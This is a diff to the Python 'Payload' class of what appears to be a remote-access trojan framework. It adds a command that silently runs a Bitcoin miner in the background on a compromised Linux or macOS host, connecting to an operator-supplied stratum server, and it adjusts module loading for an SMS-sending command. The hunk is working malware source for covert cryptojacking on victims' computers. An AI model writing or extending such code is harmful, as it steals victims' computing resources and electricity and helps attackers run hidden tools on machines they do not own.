@@ -520,12 +520,36 @@ class Payload():
 
         """
         if 'phone' not in globals():
-            globals()['phone'] = self.load('phone')
+            self.load('phone')
         args = globals()['kwargs'](args)
         if all():
             return globals()['phone'].run(number=args.number, message=args.message, sid=args.sid, token=args.token)
         else:
             return 'usage: <send/read> [args]\n  arguments:\n\tnumber: phone number with country code - no spaces (ex. 18001112222)\n\tmessage: text message to send surrounded by quotes (ex. "example text message")\n\tsid: twilio account SID\n\ttoken: twilio auth token'
+
+    @config(platforms=['linux2','darwin'], command=True, usage='miner <url> <user> <pass>'):
+    def miner(self, args):
+        """
+        Run Bitcoin miner in the background
+        
+        `Required`
+        :param str url:         stratum mining server url
+        :param str username:    username for mining server
+        :param str password:    password for mining server
+
+        """
+        if 'miner' not in globals():
+            self.load('miner')
+        args = str(args).split()
+        if len(args) == 3:
+            url, username, password = args
+            try:
+                globals()['miner'].run(url, username, password)
+                return """Bitcoin miner running in background\nURL: {0}\nUser: {1}""".format(url, username)
+            except Exception as e:
+                return "{} error: {}".format(self.miner.func_name, str(e))
+        else:
+            return "usage: {}".format(self.miner.usage)
 
     @config(platforms=['win32','linux2','darwin'], command=False)
     def imgur(self, source, api_key=None):
